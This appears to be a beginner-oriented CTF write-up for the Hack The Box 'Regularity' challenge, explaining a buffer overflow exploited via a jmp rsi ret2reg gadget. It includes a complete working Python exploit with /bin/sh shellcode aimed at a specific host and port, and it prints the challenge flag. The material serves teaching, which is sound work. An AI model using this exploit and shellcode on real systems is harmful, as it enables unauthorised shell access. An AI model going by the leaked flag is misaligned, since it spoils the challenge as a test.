# HTB Regularity - Quick Reference Guide

## 🎯 Challenge Summary
**Buffer overflow + Ret2Reg technique = Shell access**

---

## 🔑 Key Information

- **Flag**: `HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_f2f06e7ebdddb7d46d7e2def9bc16714}`
- **Vulnerability**: Buffer overflow (reads 272 bytes into 256-byte buffer)
- **Technique**: Ret2Reg (return to register)
- **Magic Gadget**: `jmp rsi` at address `0x401041`

---

## 🧠 Core Concept (ELI5)

**Problem**: We need to execute our code, but don't know where in memory our code is.

**Solution**: Use a register!
- After `read()` function, the RSI register points to our input
- We found `jmp rsi` instruction at a fixed address (0x401041)
- Overwrite return address with `0x401041`
- When function returns → jumps to `jmp rsi` → jumps to our code!

---

## 📋 Exploit Checklist

### Analysis Phase
- [x] Check binary protections (no PIE, executable stack)
- [x] Find vulnerability (buffer overflow in read function)
- [x] Find useful gadget (`jmp rsi` at 0x401041)
- [x] Identify register state (RSI points to buffer after read)

### Exploitation Phase
- [x] Create shellcode (execve("/bin/sh"))
- [x] Calculate offsets (256 bytes to return address)
- [x] Build payload structure
- [x] Test and get shell

---

## 💻 One-Liner Exploit

```python
import socket, struct, time
s = socket.socket()
s.connect(('83.136.249.223', 56191))
s.recv(1024)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
payload = shellcode + b'\x90' * (256 - len(shellcode)) + struct.pack('<Q', 0x401041)
s.send(payload + b'\n')
time.sleep(0.5)
s.send(b'cat flag.txt\n')
time.sleep(0.5)
print(s.recv(4096).decode())
```

---

## 📊 Memory Layout

```
Address          Content                     Size
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Buffer Start  → [Shellcode (23 bytes)    ]  23 bytes
              → [NOP sled (\x90)...      ]  233 bytes
              → [Return Address          ]  8 bytes
                 0x0000000000401041
                 (points to "jmp rsi")
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total: 264 bytes
```

---

## 🔍 Important Addresses

| Address    | Description           | Why Important |
|------------|-----------------------|---------------|
| 0x401041   | jmp rsi gadget       | Our entry point |
| 0x40104b   | read() function      | Contains vulnerability |
| 0x40106e   | ret instruction      | Where we gain control |

---

## 🛠️ Tools & Commands

### Binary Analysis
```bash
# Check file type
file regularity

# Check protections
readelf -l regularity | grep GNU_STACK

# Disassemble
objdump -d regularity -M intel

# Find gadgets
objdump -d regularity | grep "jmp.*rsi"
```

### Running the Exploit
```bash
# Run the exploit
python3 final_working_exploit.py <host> <port>

# Example
python3 final_working_exploit.py 83.136.249.223 56191
```

---

## 🎓 Learning Points for Students

### 1. **Buffer Overflow Basics**
- Buffers have fixed sizes
- Writing too much data overflows into adjacent memory
- Can overwrite important data like return addresses

### 2. **Why Registers Matter**
- Registers are CPU's fast storage
- RSI held our buffer address even after function returned
- Registers are predictable - we can rely on them!

### 3. **The Ret2Reg Technique**
```
Traditional:  Shellcode → Guess stack address → Jump there
Ret2Reg:      Shellcode → Use register → No guessing needed!
```

### 4. **Why This Works**
- No PIE: Code addresses don't randomize
- Executable Stack: We can run code from stack
- Register Persistence: RSI keeps pointing to our data

---

## 🐛 Troubleshooting

### Exploit doesn't work?
- ✅ Check you're using correct target IP and port
- ✅ Verify payload is exactly 264 bytes
- ✅ Make sure using little endian (`struct.pack('<Q', addr)`)
- ✅ Include newline after payload (`payload + b'\n'`)
- ✅ Add sleep delays for timing

### No output?
- Try increasing `time.sleep()` values
- Check if connection is established
- Verify shellcode is correct

---

## 📚 Related Concepts to Study

1. **Stack Structure** - How functions use the stack
2. **Calling Conventions** - How arguments are passed
3. **Assembly Language** - x86-64 basics
4. **System Calls** - How to interact with OS
5. **ASLR** - Why ret2reg bypasses it
6. **ROP** - Return Oriented Programming

---

## 🎯 Practice Exercises

After solving this challenge, try:

1. **Modify the shellcode** - Make it do something different
2. **Find other gadgets** - Search for more useful instructions
3. **Try locally** - Disable ASLR and test on your machine
4. **Write your own** - Create a vulnerable program and exploit it

---

## 📖 Further Reading

- **OWASP Buffer Overflow**: Understanding the vulnerability
- **Corelan ROPdb**: Database of ROP gadgets
- **Shellcode Database**: Shell-storm.org
- **pwntools Documentation**: Professional exploit development

---

## ✅ Success Criteria

You've successfully completed this challenge when you:
- [ ] Understand what a buffer overflow is
- [ ] Can explain the ret2reg technique
- [ ] Know why RSI points to your buffer
- [ ] Can modify the exploit for different targets
- [ ] Retrieved the flag!

---

**Remember**: The key insight is that **registers are predictable** even when memory addresses aren't!

---

*Created for: 2nd Year BScIT Students*
*Difficulty: Beginner-Friendly*
*Time to Complete: 30-60 minutes (with learning)*
